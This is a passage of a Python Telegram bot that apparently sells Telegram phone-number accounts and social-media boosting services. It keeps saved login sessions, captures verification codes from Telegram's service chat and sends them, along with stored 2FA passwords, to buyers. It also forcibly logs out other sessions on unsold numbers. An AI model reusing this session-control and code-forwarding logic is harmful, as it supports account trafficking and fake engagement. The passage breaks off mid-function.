                        _ever_sold = bool(_es_row and _es_row["ever_sold"])
                except Exception:
                    pass

                if not owner_is_logging_in and not buyer_owns_it and not _ever_sold:
                    # ─── جلسة غير مصرّح بها على رقم لم يُباع قط → نطردها فوراً ───
                    logger.warning(f"🔐 جلسة دخول غير مصرّح بها على الرقم {phone} — يتم الطرد الفوري...")
                    try:
                        await client(ResetAuthorizationsRequest())
                        logger.info(f"✅ تم طرد كل الجلسات الأخرى للرقم {phone} بنجاح.")
                        _ng_sec = NUMBERS_GROUP_ID or OWNER_ID
                        if _ng_sec:
                            await application.bot.send_message(
                                _ng_sec,
                                (
                                    "🚨 *تنبيه أمني: تم طرد جلسة غير مصرّح بها*\n\n"
                                    f"📱 الرقم: `{phone}`\n"
                                    f"🌍 الدولة: {guess_country(phone)}\n"
                                    "✅ تم طرد الجلسة الغريبة تلقائياً."
                                ),
                                parse_mode=ParseMode.MARKDOWN,
                            )
                    except Exception as kick_err:
                        logger.error(f"❌ فشل طرد الجلسة للرقم {phone}: {kick_err}")
                    return  # لا ترسل أي إشعار آخر لهذه الرسالة

                if not owner_is_logging_in and not buyer_owns_it and _ever_sold:
                    # رقم مباع سابقاً — المشتري يستخدم حسابه — لا إشعار للمالك
                    return

            # ─── إرسال الكود للمشتري — أرقام فقط، بعد تاريخ البيع فقط ───
            if buyer_id and any(ch.isdigit() for ch in text):
                # تحقق: الرسالة وصلت بعد تاريخ تخصيص الرقم
                _skip_old = False
                try:
                    with db_conn() as _c2:
                        _row_at = _c2.execute(
                            "SELECT assigned_at FROM number_stock WHERE phone_number=%s", (phone,)
                        ).fetchone()
                    if _row_at and _row_at["assigned_at"]:
                        _assigned_ts = _row_at["assigned_at"]
                        _msg_date = getattr(event, "date", None)
                        if _msg_date and _assigned_ts:
                            import datetime as _dt
                            if _msg_date.tzinfo is None:
                                _msg_date = _msg_date.replace(tzinfo=_dt.timezone.utc)
                            if hasattr(_assigned_ts, "tzinfo") and _assigned_ts.tzinfo is None:
                                _assigned_ts = _assigned_ts.replace(tzinfo=_dt.timezone.utc)
                            if _msg_date < _assigned_ts:
                                _skip_old = True
                except Exception:
                    pass
                if _skip_old:
                    return  # كود قديم قبل البيع — تجاهله
                code_match = re.search(r'(\d{4,7})', text)
                if code_match:
                    code_only = code_match.group(1)
                    # حفظ الكود في الذاكرة ليمكن جلبه عبر زر "طلب كود"
                    _buyer_received_codes[buyer_id] = {"code": code_only, "time": time.time(), "phone": phone}
                    # جلب كلمة مرور 2FA لإرسالها مع الكود
                    _auto_twofa = ""
                    try:
                        with db_conn() as _pwdb:
                            _pwrow = _pwdb.execute(
                                "SELECT twofa_password FROM number_stock WHERE phone_number=%s", (phone,)
                            ).fetchone()
                            if _pwrow:
                                _auto_twofa = (_pwrow["twofa_password"] or "").strip()
                    except Exception:
                        pass
                    _twofa_line = (
                        f"\n\n🔐 *كلمة مرور المصادقة الثنائية (2FA):*\n`{_auto_twofa}`"
                        if _auto_twofa else ""
                    )
                    try:
                        await application.bot.send_message(
                            buyer_id,
                            f"🔑 *رمز التحقق:*\n`{code_only}`"
                            f"{_twofa_line}",
                            parse_mode="Markdown"
                        )
                    except Exception as buyer_err:
                        logger.error(f"❌ فشل إرسال كود الدخول للمشتري {buyer_id} (الرقم {phone}): {buyer_err}")
                return  # كود الدخول → للمشتري فقط، لا نرسله للمالك

            # ─── هل رسالة "تغيّر التحقق بخطوتين" هذه ناتجة عن فعل البوت نفسه (تفعيل/تغيير 2FA تلقائياً)؟ ───
            is_2fa_change_msg = "two-step verification" in text.lower() and "changed" in text.lower()
            last_expected = _expected_2fa_change.get(phone)
            if is_2fa_change_msg and last_expected and (time.time() - last_expected) <= _EXPECTED_2FA_WINDOW_SEC:
                _expected_2fa_change.pop(phone, None)
                await notify_account_change(
                    application.bot, phone,
                    "✅ (طبيعي) البوت نفسه فعّل/غيّر كلمة مرور التحقق بخطوتين تلقائياً لهذا الرقم — ليس تغييراً من طرف خارجي",
                    stock_id=stock_id,
                )
                return

            translated = translate_official_notice(text)
            await notify_account_change(
                application.bot, phone, f"رسالة أمنية من تيليجرام الرسمي:\n\n{translated}",
                stock_id=stock_id,
            )
        except Exception as e:
            logger.error(f"❌ خطأ في إرسال تنبيه أمني للرقم {phone}: {e}")

    async def _on_disconnect():
        """إعادة تشغيل المراقبة تلقائياً عند انقطاع الاتصال (مثلاً انقطاع شبكة Railway).
        قبل إعادة المحاولة، يفحص إن كان الانقطاع طرداً فعلياً (جلسة أُلغيت) لا انقطاع شبكة عابر،
        فيُبلّغ المالك بالصيغة الموحّدة إن كان طرداً حقيقياً."""
        _monitor_clients.pop(phone, None)
        _monitor_tasks.pop(phone, None)
        try:
            probe = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await probe.connect()
            still_authorized = await probe.is_user_authorized()
            await probe.disconnect()
            if not still_authorized:
                stock_id2 = None
                try:
                    with db_conn() as c:
                        row3 = c.execute(
                            "SELECT id FROM number_stock WHERE phone_number=%s", (phone,)
                        ).fetchone()
                        if row3:
                            stock_id2 = row3["id"]
                except Exception:
                    pass
                await notify_account_change(
                    application.bot, phone, "تم طرد الحساب (تسجيل خروج/انتهاء الجلسة من تيليجرام)",
                    stock_id=stock_id2,
                )
                logger.warning(f"🔴 الرقم {phone} تم طرده فعلياً، توقفت مراقبته.")
                return
        except Exception as probe_err:
            logger.debug(f"⏳ تعذّر التأكد من سبب انقطاع مراقبة الرقم {phone}: {probe_err}")
        logger.warning(f"⚠️ انقطع اتصال مراقبة الرقم {phone}، سيُعاد المحاولة خلال 30 ثانية...")
        await asyncio.sleep(30)
        await _start_number_monitor(phone, session_str, application)

    client.add_event_handler(_on_official_message, events.NewMessage(chats=777000))

    try:
        await client.connect()
        if not await client.is_user_authorized():
            logger.warning(f"⚠️ جلسة الرقم {phone} غير مخوّلة (expired/revoked)، توقف عن المراقبة.")
            await client.disconnect()
            return

        _monitor_clients[phone] = client

        # ─── الإصلاح الجوهري ───────────────────────────────────────────────
        # run_until_disconnected() هي ما تُشغّل حلقة استقبال تحديثات Telethon.
        # بدونها لن تُطلق أي أحداث (NewMessage وغيرها) مطلقاً.
        # نُشغّلها كـ background task حتى لا تحجب البوت الرئيسي.
        async def _run_loop():
            try:
                await client.run_until_disconnected()
            except Exception as run_err:
                logger.error(f"❌ خطأ في حلقة مراقبة الرقم {phone}: {run_err}")
            finally:
                await _on_disconnect()

        task = asyncio.create_task(_run_loop())
        _monitor_tasks[phone] = task
        logger.info(f"👁️ بدأت مراقبة الرقم {phone} — حلقة الاستقبال تعمل بالخلفية ✅")

    except Exception as e:
        logger.warning(f"⚠️ تعذّر بدء مراقبة الرقم {phone}: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass


async def start_all_number_monitors(application):
    """يُستدعى عند إقلاع البوت: يبدأ مراقبة كل الأرقام التي تملك جلسة محفوظة بالمخزون."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    with db_conn() as c:
        rows = c.execute(
            "SELECT phone_number, session_string FROM number_stock WHERE session_string IS NOT NULL"
        ).fetchall()
    for row in rows:
        await _start_number_monitor(row["phone_number"], row["session_string"], application)
    if rows:
        logger.info(f"👁️ تم تفعيل مراقبة {len(rows)} رقم (تنبيهات أمنية فورية)")


async def retry_pending_session_resets(context: ContextTypes.DEFAULT_TYPE):
    """محاولة دورية لتسجيل خروج الجلسات الأخرى للأرقام التي فشل طردها فوراً بعد تسجيل الدخول
    (مثلاً بسبب قيود تيليجرام المؤقتة)، يعيد المحاولة كل دورة حتى تنجح، ثم يبلّغ المالك."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    with db_conn() as c:
        rows = c.execute(
            "SELECT id, phone_number, session_string, added_at FROM number_stock "
            "WHERE session_string IS NOT NULL AND (sessions_reset IS NULL OR sessions_reset=FALSE) AND assigned_to IS NULL AND ever_sold IS NOT TRUE"
        ).fetchall()
    for row in rows:
        rec = dict(row)
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                continue
            await client(ResetAuthorizationsRequest())
            # ─── فحص is_solo وcan_send_code بعد نجاح الطرد ─────────────────
            _dev_after = -1
            try:
                _dev_after = await get_device_count(client)
            except Exception:
                pass
            _is_solo_r = (_dev_after == 1)
            with db_conn() as c2:
                c2.execute(
                    "UPDATE number_stock SET sessions_reset=TRUE, is_solo=%s WHERE id=%s",
                    (_is_solo_r, rec["id"])
                )
            if _is_solo_r:
                asyncio.create_task(
                    _test_and_set_can_send_code(rec["phone_number"], rec["session_string"], rec["id"])
                )
            elapsed = _format_elapsed(rec["added_at"])
            if OWNER_ID:
                _solo_note = " | البوت الجلسة الوحيدة ✅" if _is_solo_r else " | يوجد جلسات أخرى بعد ⚠️"
                await context.bot.send_message(
                    OWNER_ID,
                    f"🔒 *تم أخيراً تسجيل خروج كل الجلسات الأخرى تلقائياً*\n\n"
                    f"📱 الرقم: `{rec['phone_number']}`\n"
                    f"⏱️ المدة منذ إضافته للبوت: {elapsed}{_solo_note}",
                    parse_mode=ParseMode.MARKDOWN
                )
            logger.info(f"🔒 تم تسجيل خروج الجلسات الأخرى (إعادة محاولة) للرقم {rec['phone_number']} | is_solo={_is_solo_r}")
        except Exception as e:
            logger.debug(f"⏳ إعادة محاولة لاحقاً لطرد جلسات الرقم {rec['phone_number']}: {e}")
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass


async def compensate_duplicate_sales_job(context: ContextTypes.DEFAULT_TYPE):
    """يفحص دورياً أرقام الهاتف التي بيعت لأكثر من مشترٍ واحد ويُعوّض
    جميع المشترين عدا الأول (صاحب أقدم سجل مكتمل).
    يُغيّر حالة سجل المكرر إلى 'duplicate_compensated' لتجنب التعويض المزدوج."""
    bot = context.bot
    try:
        with db_conn() as c:
            dupes = c.execute("""
                SELECT
                    prize_value,
                    array_agg(id          ORDER BY created_at ASC) AS pe_ids,
                    array_agg(user_id     ORDER BY created_at ASC) AS user_ids,
                    array_agg(points_cost ORDER BY created_at ASC) AS costs,
                    array_agg(order_code  ORDER BY created_at ASC) AS codes
                FROM prize_exchanges
                WHERE prize_type IN ('telegram_number', 'telegram_number_code')
                  AND prize_value NOT IN ('number', 'manual')
                  AND status = 'completed'
                GROUP BY prize_value
                HAVING COUNT(*) > 1
            """).fetchall()
    except Exception as e:
        logger.warning(f"⚠️ compensate_duplicate_sales: فشل جلب السجلات المكررة: {e}")
        return

    for dupe in (dupes or []):
        pe_ids   = dupe["pe_ids"]
        user_ids = dupe["user_ids"]
        costs    = dupe["costs"]
        codes    = dupe["codes"]
        phone    = dupe["prize_value"]

        # الأول (index 0) هو المشتري A — يحتفظ بالحساب بلا تعويض
        for i in range(1, len(pe_ids)):
            pe_id = pe_ids[i]
            uid   = user_ids[i]
            cost  = int(costs[i] or 0)
            code  = codes[i] or str(pe_id)

            # ─── حماية من التعويض المزدوج — تحقق أنه لم يُعوَّض مسبقاً ───
            try:
                with db_conn() as _chk:
                    _already = _chk.execute(
                        "SELECT compensated_at FROM prize_exchanges WHERE id=%s", (pe_id,)
                    ).fetchone()
                if _already and _already["compensated_at"]:
                    logger.info(f"⏭ compensate_duplicate_sales: pe_id={pe_id} عُوِّض مسبقاً، تخطّي.")
                    continue
            except Exception:
                pass

            # تسجيل التعويض ذرياً قبل منح النقاط
            try:
                with db_conn() as _rec:
                    _rec.execute(
                        "UPDATE prize_exchanges SET status='duplicate_compensated', "
                        "compensated_at=NOW(), compensated_pts=%s, compensated_reason='auto_duplicate' "
                        "WHERE id=%s AND compensated_at IS NULL",
                        (cost, pe_id)
                    )
                    _updated = _rec.rowcount
                if _updated == 0:
                    logger.info(f"⏭ compensate_duplicate_sales: pe_id={pe_id} سُبق بالتعويض، تخطّي.")
                    continue
            except Exception as e:
                logger.warning(f"⚠️ compensate_duplicate_sales: فشل تسجيل التعويض pe_id={pe_id}: {e}")
                continue

            # إعادة النقاط إن كانت تُخصم
            if cost > 0:
                add_points(uid, cost)

            # إشعار المشتري المتضرر
            try:
                msg = (
                    f"⚠️ *تنبيه — تعويض تلقائي*\n\n"
                    f"اكتشف النظام أن الرقم الذي حصلت عليه بكود `{code}` "
                    f"قد سُلِّم بالخطأ لأكثر من شخص.\n\n"
                )
                if cost > 0:
                    msg += f"✅ تم إعادة *{cost:,} نقطة* لرصيدك تلقائياً.\n\n"
                else:
                    msg += "✅ تم تسجيل الحادثة وسيتواصل معك المالك لحلها.\n\n"
                msg += "نعتذر عن هذا الخلل ونقدّر صبرك 🙏"
                await bot.send_message(uid, msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.warning(f"⚠️ compensate_duplicate_sales: فشل إشعار المستخدم {uid}: {e}")

            # (إشعار المالك عن التعويض التلقائي أُلغي — يظهر في شاشة تعويض المظلومين)

            logger.info(
                f"✅ compensate_duplicate_sales: عوّضنا المستخدم {uid} "
                f"({cost:,} نقطة) بسبب بيع مكرر للرقم {phone} (pe_id={pe_id})"
            )


async def check_pending_orders_job(context: ContextTypes.DEFAULT_TYPE):
    """يفحص دورياً حالة الطلبات المعلّقة عبر API موقع الرشق، ويحدّث حالتها:
    - Completed  ← يُعلّم الطلب مكتملاً ويُشعر المستخدم.
    - Partial    ← يُعلّم مكتملاً ويُعيد النقاط المستحقة (1000 نقطة/سنت) لموقع SMMMAIN.
    - Canceled/Failed/Error ← يُعيد كامل النقاط ويُشعر المستخدم.
    - Pending/Processing → لا تغيير، يُعاد فحصه لاحقاً."""
    try:
        with db_conn() as c:
            pending = c.execute(
                "SELECT o.*, s.panel AS svc_panel, s.api_service_id AS svc_api_id FROM orders o "
                "LEFT JOIN services s ON s.id = o.service_id "
                "WHERE o.status='pending' AND o.api_order_id IS NOT NULL AND o.api_order_id != ''"
            ).fetchall()
    except Exception as e:
        logger.warning(f"⚠️ فشل جلب الطلبات المعلّقة للفحص الدوري: {e}")
        return

    for o in pending:
        panel = o.get("svc_panel") or 1
        try:
            res = await asyncio.to_thread(smm_order_status, o["api_order_id"], panel)
        except Exception as e:
            logger.warning(f"⚠️ فشل فحص حالة الطلب {o.get('order_code')}: {e}")
            continue
        if not isinstance(res, dict) or "error" in res:
            continue
        panel_status = str(res.get("status", "")).strip().lower()
        if not panel_status:
            continue

        if panel_status == "completed":
            with db_conn() as c:
                c.execute("UPDATE orders SET status='completed' WHERE id=?", (o["id"],))
            try:
                await context.bot.send_message(
                    o["user_id"],
                    f"🎉 تم اكتمال طلبك بكود {o['order_code']} بنجاح!\nنتمنى أن تكون راضياً عن الخدمة 🌟"
                )
            except Exception:
                pass

        elif panel_status == "partial":
            # ── حساب النقاط المستردّة (فقط لموقع SMMMAIN - الموقع 1) ──
            remains    = int(res.get("remains", 0) or 0)
            refund_pts = 0
            if panel == 1 and remains > 0 and o.get("svc_api_id"):
                refund_pts = await asyncio.to_thread(_calc_partial_refund_pts, o["svc_api_id"], remains)

            with db_conn() as c:
                c.execute(
                    "UPDATE orders SET status='completed', partial_refund_pts=%s WHERE id=%s",
                    (refund_pts, o["id"])
                )
            if refund_pts > 0:
                add_points(o["user_id"], refund_pts)
                logger.info(f"💰 استرجاع جزئي: طلب {o['order_code']} — {refund_pts:,} نقطة → مستخدم {o['user_id']}")

            try:
                if refund_pts > 0:
                    msg = (
                        f"⚠️ طلبك بكود `{o['order_code']}` اكتمل *جزئياً*.\n\n"
                        f"📦 الوحدات غير المنفذة: {remains:,}\n"
                        f"💰 تم استرجاع *{refund_pts:,}* نقطة لرصيدك تعويضاً عن الجزء الناقص.\n\n"
                        f"ℹ️ سياسة الموقع: يُعيد الموقع قيمة الجزء غير المنفذ تلقائياً."
                    )
                else:
                    msg = (
                        f"⚠️ طلبك بكود {o['order_code']} اكتمل جزئياً.\n"
                        f"ℹ️ تم تنفيذ الطلب جزئياً حسب سياسة الموقع."
                    )
                await context.bot.send_message(o["user_id"], msg, parse_mode="Markdown")
            except Exception:
                pass

        elif panel_status in ("canceled", "cancelled", "failed", "error"):
            with db_conn() as c:
                c.execute("UPDATE orders SET status='cancelled' WHERE id=?", (o["id"],))
            pts = o.get("cost_points", 0) or 0
            if pts:
                add_points(o["user_id"], pts)
            try:
                await context.bot.send_message(
                    o["user_id"],
                    f"🔴 تم إلغاء طلبك بكود {o['order_code']} من قبل موقع الرشق وإعادة *{pts}* نقطة لرصيدك.\n\n"
                    f"{LINK_ERROR_GUIDANCE}",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
        # حالات أخرى (Pending/In progress/Processing) → لا تغيير، فحص لاحق

# ────────────────────────────────────────────────────────────
#  مساعدات رياضية
# ────────────────────────────────────────────────────────────
def fmt_price(n) -> str:
    """يعرض السعر بدون فاصلة عشرية إن كان رقماً صحيحاً (100.0 → 100)، وإلا يُبقيه كما هو."""
    try:
        f = float(n)
    except (TypeError, ValueError):
        return str(n)
    return str(int(f)) if f == int(f) else str(f)


CATEGORY_MAP = {
    "followers":    "رشق متابعين",
    "views":        "رشق مشاهدات",
    "interactions": "رشق تفاعلات",
    "story_views":  "رشق مشاهدات ستوري",
    "start_bot":    "رشق بدء (ستارت) بوت",
    "boost":        "تعزيز قناة أو كروب",
    "post_stars":   "نجوم على بوست قناة",
    "other":        "خدمات أخرى",
}

# ────────────────────────────────────────────────────────────
#  إدارة أزرار القوائم (يتحكم بها المالك: إضافة/حذف/ترتيب/تحجيم)
# ────────────────────────────────────────────────────────────
# منصات "خدمات": كل منصة قائمة فرعية مستقلة يمكن للمالك تعبئتها بفئات/أزرار خاصة بها.
SERVICE_PLATFORMS = [
    ("📱 تيلجرام", "services_menu_tg"),
    ("📸 انستغرام", "services_menu_ig"),
    ("🎵 تيك توك", "services_menu_tt"),
    ("💬 واتساب", "services_menu_wa"),
    ("📘 فيس بوك", "services_menu_fb"),
    ("▶️ يوتيوب", "services_menu_yt"),
    ("👻 سناب شات", "services_menu_sc"),
    ("🐦 تويتر", "services_menu_tw"),
]
SERVICE_PLATFORM_MENUS = {v for _, v in SERVICE_PLATFORMS}

# ربط كل قائمة منصة بكود المنصة المستخدم في عمود platform بجدول services
PLATFORM_MENU_MAP = {
    "services_menu_tg": "tg",
    "services_menu_ig": "ig",
    "services_menu_tt": "tt",
    "services_menu_wa": "wa",
    "services_menu_fb": "fb",
    "services_menu_yt": "yt",
    "services_menu_sc": "sc",
    "services_menu_tw": "tw",
}
PLATFORM_LABEL_MAP = {
    "tg": "📱 تيلجرام",
    "ig": "📸 انستغرام",
    "tt": "🎵 تيك توك",
    "wa": "💬 واتساب",
    "fb": "📘 فيس بوك",
    "yt": "▶️ يوتيوب",
    "sc": "👻 سناب شات",
    "tw": "🐦 تويتر",
}

MENU_LABELS = {"main": "القائمة الرئيسية", "owner_settings": "قائمة إعدادات المالك", "collect_points": "تجميع نقاط", "contact_support": "تواصل مع الدعم", "services_menu": "قائمة الخدمات"}
MENU_LABELS.update({v: f"خدمات: {lbl.split(' ', 1)[1]}" for lbl, v in SERVICE_PLATFORMS})
MENU_LABELS.update({f"cat:{k}": f"قائمة فئة: {v}" for k, v in CATEGORY_MAP.items()})

# فئات "الرشق" الأساسية بالإضافة إلى التعزيز والنجوم، التي تم دمجها جميعها
# ضمن قائمة فرعية "📱 تيلجرام" داخل "🛍 خدمات" (تمهيداً لإضافة منصات أخرى مستقبلاً).
SERVICES_MENU_CATEGORIES = ["followers", "views", "interactions", "story_views", "start_bot", "boost", "post_stars", "other"]

MANAGEABLE_MENUS = ["main", "owner_settings", "services_menu"] + [v for _, v in SERVICE_PLATFORMS] + [f"cat:{k}" for k in CATEGORY_MAP]

BUILTIN_DEFAULTS = {
    "main": [
        ("🐺 خدمات", "services_menu", 1),
        ("🦇 تمويل قناتك حقيقي", "fund_channel", 1),
        ("👻 رابط دعوة", "referral", 1),
        ("👍 شحن نقاط", "charge_points", 2), ("⭐ تجميع نقاط", "collect_points", 2),
        ("🎁 استبدال نقاط بجوائز", "exchange_points", 2), ("🎙 تحويل النقاط", "transfer_points", 2),
        ("🎟 استخدام كود", "use_promo", 2), ("⭐ معلوماتي", "my_info", 2),
        ("🎁 الأكثر دعوةً اليوم", "top_ref_today", 2),
        ("✅ تواصل مع الدعم", "contact_support", 2),
        ("🏆 مسابقة الدعوة", "referral_contest_view", 2),
    ],
    "services_menu": [(label, value, 2) for label, value in SERVICE_PLATFORMS],
    "services_menu_tg": [
        ("👥 رشق متابعين", "cat:followers", 2), ("👁 رشق مشاهدات", "cat:views", 2),
        ("💬 رشق تفاعلات", "cat:interactions", 2), ("📖 رشق مشاهدات ستوري", "cat:story_views", 2),
        ("🤖 رشق بدء (ستارت) بوت", "cat:start_bot", 2), ("📣 تعزيز قناة أو كروب", "cat:boost", 2),
        ("⭐ نجوم على بوست قناة", "cat:post_stars", 1),
        ("🔧 خدمات أخرى", "cat:other", 1),
    ],
    # المنصات الأخرى — نفس فئات تيلجرام الأساسية تظهر تلقائياً (دون start_bot/boost/post_stars)
    "services_menu_ig": [
        ("👥 متابعين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("💬 تفاعلات",          "cat:interactions", 2), ("📖 مشاهدات ستوري",  "cat:story_views", 2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_tt": [
        ("👥 متابعين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("💬 تفاعلات",          "cat:interactions", 2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_wa": [
        ("👥 أعضاء",           "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_fb": [
        ("👥 متابعين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("💬 تفاعلات",          "cat:interactions", 2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_yt": [
        ("👥 مشتركين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("💬 تفاعلات",          "cat:interactions", 2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_sc": [
        ("👥 متابعين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("📖 مشاهدات ستوري",   "cat:story_views",  2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "services_menu_tw": [
        ("👥 متابعين",         "cat:followers",    2), ("👁 مشاهدات",        "cat:views",       2),
        ("💬 تفاعلات",          "cat:interactions", 2),
        ("🔧 خدمات أخرى",      "cat:other",        1),
    ],
    "owner_settings": [
        ("➕ إضافة خدمة", "os:add_service", 2), ("📋 قائمة الخدمات", "os:list_services", 2),
        ("🗂 عرض الخدمات", "os:view_services", 2), ("📦 قسم الطلبات", "os:orders_section", 2),
        ("🎁 تعديل الهدية اليومية", "os:edit_gift", 2), ("🎀 جوائز مخصصة", "os:manage_prizes", 2),
        ("🔗 تعديل نقاط الدعوة", "os:edit_referral", 2),
        ("⭐ سعر النجمة شحن", "os:edit_star_rate", 2), ("🏆 سعر نجمة الجوائز", "os:edit_exchange_rate", 2),
        ("📦 باقات الاستبدال بنجوم", "os:manage_star_packages", 1),
        ("📱 سعر رقم تيلغرام", "os:edit_number_cost", 2), ("💌 رسالة الترحيب", "os:edit_welcome", 2),
        ("📥 مخزون أرقام تيلغرام", "os:manage_numbers", 2),
        ("🎟 أكواد شراء رقم", "os:manage_num_codes", 2),
        ("🔄 سعر تمويل داخلي", "os:edit_internal_cost", 2),
        ("🎁 نقاط الانضمام للقنوات", "os:edit_join_reward", 1),
        ("❌ خصم مغادرة القناة", "os:edit_leave_penalty", 1),
        ("⏱ مهلة المغادرة الآمنة (ساعة)", "os:edit_leave_grace", 1),
        ("⭐ إجباري: حد أدنى (نجوم)", "os:edit_mstars_min", 2), ("⭐ إجباري: حد الشريحة 1", "os:edit_mstars_t1max", 2),
        ("⭐ إجباري: سعر ش1 (×100)", "os:edit_mstars_t1p", 2), ("⭐ إجباري: سعر ش2 (×100)", "os:edit_mstars_t2p", 2),
        ("💰 إجباري-نقاط: سعر/عضو", "os:edit_mpoints_price", 2), ("💰 إجباري-نقاط: حد أدنى", "os:edit_mpoints_min", 2),
        ("📡 إدارة قنوات الاشتراك", "os:manage_channels", 2), ("👥 حد أدنى تمويل داخلي", "os:edit_internal_min", 2),
        ("❌ إلغاء صفقة", "os:cancel_order", 2),
        ("✅ إكمال طلب", "os:complete_order", 2),
        ("🎟 إنشاء كود ترويجي", "os:create_promo", 2), ("📋 أكواد ترويجية", "os:list_promos", 2),
        ("🚫 إدارة الحظر", "os:ban_menu", 2),
        ("🔍 من استخدم الكود", "os:search_code", 2),
        ("💰 منح/خصم نقاط", "os:manage_points", 2),
        ("💬 رابط تواصل المالك", "os:edit_contact", 2), ("✏️ نص زر التواصل", "os:edit_contact_label", 2),
        ("📲 تعديل نص اسيا سيل", "os:edit_asiacell", 2),
        ("✏️ نص زر الدعم بالقائمة", "os:edit_support_label", 2), ("📢 رسالة جماعية", "os:broadcast", 2),
        ("🔐 تفعيل/تعطيل التحقق", "os:toggle_captcha", 2), ("📊 إحصائيات", "os:stats", 2),
        ("🛠 وضع الصيانة", "os:toggle_maintenance", 2),
        ("📱 استبدال الأرقام", "os:toggle_number_exchange", 2),
        ("🏆 الأكثر إرسالاً لرابط الدعوة", "os:top_referrers", 2),
        ("🎯 مسابقة رابط الدعوة", "os:referral_contest", 1),
        ("💵 رصيد موقع الرشق", "os:site_balance", 1),
        ("🧩 إدارة الأزرار", "os:manage_buttons", 1),
        ("✏️ رسالة عند الاستبدال", "os:edit_exchange_msg", 1),
        ("⚠️ تعويض المظلومين", "os:failed_deliveries", 1),
    ],
}

GOTO_TARGETS = [
    ("🏠 القائمة الرئيسية", "main_menu"), ("🛍 خدمات", "services_menu"),
    ("🔗 رابط دعوة", "referral"), ("💰 تجميع نقاط", "collect_points"),
    ("💎 شحن نقاط", "charge_points"),
    ("🏆 استبدال نقاط بجوائز", "exchange_points"), ("↔️ تحويل النقاط", "transfer_points"),
    ("🎟 استخدام كود", "use_promo"), ("ℹ️ معلوماتي", "my_info"), ("📺 تمويل قناتك حقيقي", "fund_channel"),
] + SERVICE_PLATFORMS + [(v, f"cat:{k}") for k, v in CATEGORY_MAP.items()]


def seed_menu_items(menu: str):
    # تأكد من حذف daily_gift و join_channels من القائمة الرئيسية دائماً
    with db_conn() as c:
        c.execute(
            "DELETE FROM menu_items WHERE menu='main' AND action_value IN ('daily_gift','join_channels')"
        )
    # ترحيل التثبيتات القديمة: أزرار "الرشق" الأساسية الخمسة كانت منفصلة في القائمة الرئيسية،
    # أصبحت الآن مدمجة داخل زر واحد "🛍 خدمات" (services_menu)، فتُحذف نسخها القديمة من "main"
    # حتى لا تظهر مكررة، بشرط عدم حذف أي تعديل قام المالك بتخصيصه لغير هذه الأزرار.
    if menu == "main":
        with db_conn() as c:
            old_cats = tuple(f"cat:{k}" for k in SERVICES_MENU_CATEGORIES)
            c.execute(
                f"DELETE FROM menu_items WHERE menu='main' AND action_type='builtin' AND action_value IN "
                f"({','.join('?' for _ in old_cats)})",
                old_cats
            )
        # زر "🛍 خدمات" يجب أن يبقى دائماً أول زر في القائمة الرئيسية، حتى في التثبيتات القديمة
        # التي أُدرج فيها هذا الزر لاحقاً (بترتيب أُلحق في آخر القائمة عند أول ظهوره).
        with db_conn() as c:
            row = c.execute(
                "SELECT MIN(sort_order) AS m FROM menu_items WHERE menu='main'"
            ).fetchone()
            min_order = row["m"] if row and row["m"] is not None else 0
            c.execute(
                "UPDATE menu_items SET sort_order=? WHERE menu='main' AND action_value='services_menu'",
                (min_order - 1,)
            )
        # ترحيل تحديث الأيقونات/التخطيط لأزرار القائمة الرئيسية إلى الطابع الجديد (مستوحى من طلب المالك)،
        # فقط للأزرار التي لا تزال بأيقوناتها القديمة الافتراضية (لا نلمس أي زر عدّله المالك يدوياً بنفسه).
        _main_icon_migration = {
            "services_menu":    ("🛍 خدمات", "🐺 خدمات", 1),
            "fund_channel":     ("📺 تمويل قناتك حقيقي", "🦇 تمويل قناتك حقيقي", 1),
            "referral":         ("🔗 رابط دعوة", "👻 رابط دعوة", 1),
            "charge_points":    ("💎 شحن نقاط", "👍 شحن نقاط", 2),
            "collect_points":   ("💰 تجميع نقاط", "⭐ تجميع نقاط", 2),
            "exchange_points":  ("🏆 استبدال نقاط بجوائز", "🎁 استبدال نقاط بجوائز", 2),
            "transfer_points":  ("↔️ تحويل النقاط", "🎙 تحويل النقاط", 2),
            "my_info":          ("ℹ️ معلوماتي", "⭐ معلوماتي", 2),
            "top_ref_today":    ("🏆 الأكثر دعوةً اليوم", "🎁 الأكثر دعوةً اليوم", 2),
            "contact_support":  ("🛎 تواصل مع الدعم", "✅ تواصل مع الدعم", 2),
        }
        with db_conn() as c:
            for action_value, (old_label, new_label, new_width) in _main_icon_migration.items():
                c.execute(
                    "UPDATE menu_items SET label=?, width=? WHERE menu='main' AND action_value=? AND label=?",
                    (new_label, new_width, action_value, old_label)
                )
    # ترحيل إضافي: فئات "الرشق"/"التعزيز"/"النجوم" كانت مباشرة داخل قائمة "خدمات" (services_menu)،
    # أصبحت الآن تحت قائمة فرعية جديدة "📱 تيلجرام" (services_menu_tg) تمهيداً لإضافة منصات أخرى مستقبلاً.
    if menu == "services_menu":
        with db_conn() as c:
            old_cats = tuple(f"cat:{k}" for k in SERVICES_MENU_CATEGORIES)
            c.execute(
                f"DELETE FROM menu_items WHERE menu='services_menu' AND action_type='builtin' AND action_value IN "
                f"({','.join('?' for _ in old_cats)})",
                old_cats
            )
    with db_conn() as c:
